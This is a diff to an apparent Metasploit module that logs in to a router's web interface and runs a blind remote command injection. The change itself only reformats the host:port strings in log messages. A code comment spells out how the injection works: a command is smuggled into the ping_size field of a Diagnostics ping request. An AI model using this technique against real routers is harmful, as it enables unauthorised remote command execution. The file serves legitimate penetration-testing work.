@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
     user = datastore['HttpUsername']
     pass = datastore['HttpPassword']
 
-    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Trying to login with #{user} / #{pass}")
 
     begin
       res = send_request_cgi({
@@ -63,24 +63,24 @@ class MetasploitModule < Msf::Auxiliary
       return if (res.code == 404)
 
       if [200, 301, 302].include?(res.code)
-        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
+        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Successful login #{user}/#{pass}")
       else
-        print_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
+        print_error("#{Rex::Socket.to_authority(rhost, rport)} - No successful login possible with #{user}/#{pass}")
         return
       end
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
       return
     end
 
-    print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending remote command: " + datastore['CMD'])
 
     cmd = datastore['CMD']
     # original post request:
     # data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&
     # action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="
 
-    vprint_status("#{rhost}:#{rport} - using the following target URL: #{uri}")
+    vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - using the following target URL: #{uri}")
     begin
       send_request_cgi({
         'uri' => uri,
@@ -99,10 +99,10 @@ class MetasploitModule < Msf::Auxiliary
         }
       })
     rescue ::Rex::ConnectionError
-      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+      vprint_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to connect to the web server")
       return
     end
-    print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
-    print_status("#{rhost}:#{rport} - Blind Exploitation - wait around 10 seconds till the command gets executed")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Blind Exploitation - unknown Exploitation state")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Blind Exploitation - wait around 10 seconds till the command gets executed")
   end
 end
